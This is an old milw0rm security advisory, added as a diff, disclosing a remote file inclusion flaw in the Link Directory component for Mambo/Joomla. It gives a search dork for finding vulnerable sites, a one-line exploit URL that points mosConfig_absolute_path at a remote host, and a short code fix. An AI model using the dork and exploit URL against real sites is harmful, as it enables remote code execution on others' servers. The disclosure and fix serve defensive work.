@@ -1,0 +1,77 @@
+    .:[ insecurity research team ]:.
+     .__..____.:.______.____.:.____ .
+ .:. |  |/    \:/  ___// __ \:/   _\.:.
+   : |  |   |  \\____\\  ___/\   /__ :. .
+ ..: |__|___|  /____  >\___  >\___  >.:
+   .:.. ..  .\/   .:\/:.  .\/.  .:\/:
+ .   ...:.    .advisory.    .:...
+         :..................: 18.o8.2oo6 ..
+ 
+ 
+  Affected Application: Link Directory <= v1.0.3
+
+          (Mambo/Joomla CMS Component)
+ 
+ 
+ . . :[ contact ]: . . . . . . . . . . . . . . . . . . . . . . . . . . .
+ 
+ 
+  Discoverd by: camino
+ 
+  Team: Insecurity Research Team
+ 
+  URL: http://www.insecurityresearch.org
+ 
+  E-Mail: camino[at]sexmagnet[dot]com
+ 
+ 
+ 
+ . . :[ insecure application details ]: . . . . . . . . . . . . . . . . .
+ 
+ 
+  Typ: Remote [x]  Local [ ]
+ 
+       Remote File Inclusion [x]  SQL Injection [ ]
+ 
+  Level: Low [ ]  Middle [x]  High [ ]
+ 
+  Application: Link Directory
+ 
+  Version: <= 1.0.3
+ 
+  Vulnerable File: toolbar.linkdirectory.html.php
+ 
+  URL: http://www.sonerekici.com
+ 
+  Description: It's a component to publish links.
+ 
+  Dork: inurl:"com_linkdirectory"
+ 
+ 
+ 
+ . . :[ exploit ]: . . . . . . . . . . . . . . . . . . . . . . . . . . .
+
+
+  http://[sitepath]/[joomlapath]/administrator/components/com_linkdirectory/toolbar.linkdirectory.html.php?mosConfig_absolute_path=http://huh?
+ 
+ . . :[ how to fix ]: . . . . . . . . . . . . . . . . . . . . . . . . . .
+ 
+ 
+  o1.) open toolbar.linkdirectory.html.php
+ 
+  o2.) add this after line 8:
+
+         defined( '_VALID_MOS' ) or 
+
+         die( 'Direct Access to this location is not allowed.' );
+
+  o3.) done!
+
+
+
+ . . :[ greets ]: . . . . . . . . . . . . . . . . . . . . . . . . . . . .
+ 
+ 
+  my girlfriend, brOmstar, ACiDAngel, PoKi, Waze and all the sexy members of insecurity research team ;-)
+
+# milw0rm.com [2006-08-18]
